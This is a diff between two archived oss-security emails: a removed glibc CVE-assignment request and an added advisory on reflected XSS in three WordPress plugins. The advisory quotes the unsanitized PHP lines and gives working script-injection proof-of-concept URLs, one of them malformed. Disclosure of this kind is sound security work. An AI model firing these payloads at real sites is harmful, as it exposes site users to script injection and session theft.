@@ -1,75 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/19/12
-Message-ID: <CANO=Ty0CBF_LOa=8+sC1bdGH-6RvvA0YTpeOCdBQuSmG=PE75A@mail.gmail.com>
-Date: Tue, 19 Jan 2016 11:06:32 -0700
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Cc: Assign a CVE Identifier <cve-assign@...re.org>
-Subject: Re: CVE assignment request for security bugs fixed in glibc 2.23
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/11/12
+Message-id: <1E5802AD-8BE2-42C4-BA73-9773050C1FA5@me.com>
+Date: Wed, 11 May 2016 12:28:33 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Reflected XSS in three Wordpress plugins.
 Content-Type: text/plain; charset=utf-8
 
-I'll assign these tomorrow unless Mitre gets to them first, the one
-request swbz#18928
-is already several months old and shouldn't take this long.
+Hello List,
 
-On Tue, Jan 19, 2016 at 11:04 AM, Florian Weimer <fweimer@...hat.com> wrote:
+I've manually confirmed these vulnerabilities:
 
-> Hi,
->
-> we are preparing the glibc 2.23 release upstream and have fixed the
-> following security bugs which, to my best knowledge, lack public CVE
-> assignment so far:
->
-> Passing out of range data to strftime() causes a segfault
-> https://sourceware.org/bugzilla/show_bug.cgi?id=18985
->
-> Out-of-range time values passed to the strftime function may cause it to
-> crash, leading to a denial of service, or potentially disclosure
-> information.
->
-> LD_POINTER_GUARD is not ignored for privileged binaries
-> https://sourceware.org/bugzilla/show_bug.cgi?id=18928
->
-> LD_POINTER_GUARD was an environment variable which controls
-> security-related behavior, but was not ignored for privileged binaries
-> (in AT_SECURE mode).  This might allow local attackers (who can supply
-> the environment variable) to bypass intended security restrictions.
->
-> hcreate((size_t)-1) should fail with ENOMEM
-> https://sourceware.org/bugzilla/show_bug.cgi?id=18240
->
-> This is an integer overflow in hcreate and hcreate_r which can result in
-> an out-of-bound memory access.  This could lead to application crashes
-> or, potentially, arbitrary code execution.
->
-> nan function unbounded stack allocation
-> https://sourceware.org/bugzilla/show_bug.cgi?id=16962
->
-> A stack overflow (unbounded alloca) can cause applications which process
-> long strings with the nan function to crash or, potentially, execute
-> arbitrary code.
->
-> catopen() Multiple unbounded stack allocations
-> https://sourceware.org/bugzilla/show_bug.cgi?id=17905
->
-> A stack overflow (unbounded alloca) in the catopen function can cause
-> applications which pass long strings to the catopen function to crash
-> or, potentially execute arbitrary code.
->
->
-> Several people have asked for CVE assignment for swbz#18928 on
-> oss-security already.
->
-> Thanks,
-> Florian
->
+Title: Reflected XSS in wordpress plugin enhanced-tooltipglossary v3.2.8
+Date: 2016-02-09
+Download Site: https://wordpress.org/plugins/enhanced-tooltipglossary
+Vulnerability:
+There is a reflected XSS vulnerability in the following php code ./enhanced-tooltipglossary/backend/views/admin_importexport.php:
+19:        ?> (<?php echo $_GET['itemsnumber']; ?> items read from file)</div>
+The variable itemsnumber appears to send unsanitized data back to the users browser.
+DWF-2016-77246
+PoC:
+This is a tested exploit:
+http://[target]/wp-content/plugins/enhanced-tooltipglossary/backend/views/admin_importexport.php?itemsnumber=<script>alert(1)</script>&msg=imported
+Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=37
 
 
+Title: Reflected XSS in wordpress plugin tera-charts v1.0
+Date: 2016-02-09
+Download Site: https://wordpress.org/plugins/tera-charts (removed by WP)
+Vulnerability:
+There is a reflected XSS vulnerability in the following php code ./tera-charts/charts/treemap.php:
+52:    var data_filename = "<?php echo $_GET['fn']; ?>";
+55:    var chart_userid = "<?php echo $_GET['userid']; ?>";
+The variable fn appears to send unsanitized data back to the users browser.
+DWF-2016-77716
+PoC:
+This is a tested exploit:
+http://wp-site/tera-charts/charts/treemap.php?fn=";</script><script>alert(1);</script><script>"&userid=1
+Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=455
 
--- 
 
---
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-Red Hat Product Security contact: secalert@...hat.com
+Title: Reflected XSS in wordpress plugin pondol-carousel v1.0 (no response from author)
+Date: 2016-02-09
+Download Site: https://wordpress.org/plugins/pondol-carousel
+Vulnerability:
+There is a reflected XSS vulnerability in the following php code ./pondol-carousel/pages/admin_create.php:
+5:	var itemid	= "<?php echo $_GET["itemid"];?>";
+The variable itemid appears to send unsanitized data back to the users browser.
+DWF-2016-77531
+PoC:
+This is a tested exploit:
+http://wp-sitehttp://192.168.0.115/pondol-carousel/pages/admin_create.php?itemid=";</script><script>alert(1);</script>"
+Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=524
 
+
+For more information on DWF assignments see https://github.com/distributedweaknessfiling/DWF-Documentation
